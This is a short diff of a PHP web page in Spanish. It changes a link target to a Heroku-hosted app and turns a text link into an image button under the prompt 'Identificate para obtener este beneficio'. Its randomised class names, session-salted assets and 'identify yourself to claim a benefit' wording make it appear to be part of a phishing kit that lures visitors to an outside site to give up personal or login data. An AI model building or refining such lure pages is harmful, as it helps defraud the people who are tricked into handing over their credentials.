@@ -62,7 +62,7 @@ $BC = _cn('bc');
 // ---------------------------------------------------------------
 // 3) URL destino + assets con salt de sesión
 // ---------------------------------------------------------------
-$U  = 'https://cam-avaz-f71d62d6e26e.herokuapp.com/simulador/';
+$U  = 'https://cam-avaz-f71d62d6e26e.herokuapp.com/';
 $Q1 = htmlspecialchars(asset('img/lapiz.svg'));
 $Q2 = htmlspecialchars(asset('img/silla.png'));
 $Q3 = htmlspecialchars(asset('img/plato.png'));
@@ -206,9 +206,13 @@ header('X-Frame-Options: SAMEORIGIN');
     </a>
 
     <div class="<?= $BN ?>">
-      <p class="<?= $BT ?>">Identificate para obtener este beneficio</p>
+      <p class="<?= $BT ?>">Identificate para obtener este beneficio haz clic en "Solicitar Ahora".</p>
       <img class="<?= $CI ?>" src="<?= $Q3 ?>" alt="">
-      <a href="<?= $U ?>" class="<?= $LB ?>" style="margin-top:20px;display:inline-block">Solicitar ahora</a>
+      <center>
+        <a href="<?= $U ?>">
+          <img class="<?= $BC ?>" style="width:220px;margin-top:30px" src="<?= $Q4 ?>" alt="">
+        </a>
+      </center>
     </div>
 
     <br>
